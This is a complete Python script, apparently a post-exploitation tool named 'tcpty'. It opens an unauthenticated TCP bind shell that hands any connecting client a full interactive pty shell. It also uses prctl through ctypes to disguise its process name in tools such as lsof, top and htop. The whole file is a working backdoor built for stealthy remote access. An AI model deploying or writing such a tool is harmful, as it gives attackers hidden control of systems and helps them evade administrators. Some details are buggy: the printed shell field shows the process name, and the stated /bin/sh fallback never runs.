#!/usr/bin/env python
##
# interactive pty server
# ----------------------
# pty usage:
# this script makes use of the 'pty' library
# to start a full tcp shell of your choosing.
# while you are given a full pty, certain apps
# like vim might not work correctly. also, be
# careful when using 'Ctrl+C' since this will
# close the shell connection completely but leave
# the server-side script running.
#
# process name:
# simple ctypes usage to 'spoof' the scripts
# process name in certain Linux applications.
# it will show the given procname in apps like
# lsof, top, htop, etc. the 'python' name will
# still show up in ps.
##

import socket
import pty
import os
import sys
import select
import argparse
from ctypes import cdll, byref, create_string_buffer

def set_process(name):
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(name)+1)
    buff.value = name
    libc.prctl(15, byref(buff), 0, 0, 0)

def bind_pty(host, port, shell):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    server.bind((host, int(port)))
    try:
        server.listen(5)
        print("[*] server listening...")
    except:
        print("[!] failed to start server. is the port all ready in use?")
        sys.exit(1)

    while True:
        sock, remote = server.accept()
        print("[*] new client connected!")
        if os.fork():
            continue
        print("[-] starting pty shell...")
        pid, child = pty.fork()
        if pid == 0:
            if os.path.exists(shell):
                pty.spawn(shell)
            else:
                print('[*] shell %s not found. using /bin/sh.' % shell)
        else:
            a = sock.makefile(os.O_RDONLY|os.O_NONBLOCK)
            c = os.fdopen(child, 'r+'); data = '';
            x = {a:c, c:a}
            while True:
                for f in select.select([a,c], [], [])[0]:
                    try: 
                        d = os.read(f.fileno(), 4096)
                    except:
                        sys.exit(0)
                    if f is c and d.strip() == data:
                        data = ''; continue
                    x[f].write(d)
                    x[f].flush()
                    data = d.strip()
    print("[*] closing tcp server...")
    server.close()
    sys.exit(1)


help = """spawns an interactive pty server using the shell of your choice, while making use of ctypes to spoof the running processes name for certain Linux application"""
parser = argparse.ArgumentParser(description=help, prog="tcpty")
parser.add_argument('--host', help='server host', required=True)
parser.add_argument('--port', help='server port', type=int, required=True)
parser.add_argument('--shell', help='shell type', required=True, choices=['sh', 'bash', 'zsh'])
parser.add_argument('--name', help='process name', required=True)
args = parser.parse_args()

print("\n[ Server Details ]")
print(" Name:\t%s" % args.name)
print(" Host:\t%s" % args.host)
print(" Port:\t%d" % args.port)
print("Shell:\t%s" % args.name)
print("\n")
print("[-] setting process name..")
set_process(args.name)
print("[-] attempting to start tcp server...")
if args.shell == 'sh':
    shell = '/bin/sh'
elif args.shell == 'zsh':
    shell = '/bin/zsh'
elif args.shell == 'bash':
    shell = '/bin/bash'
bind_pty(args.host, args.port, shell)



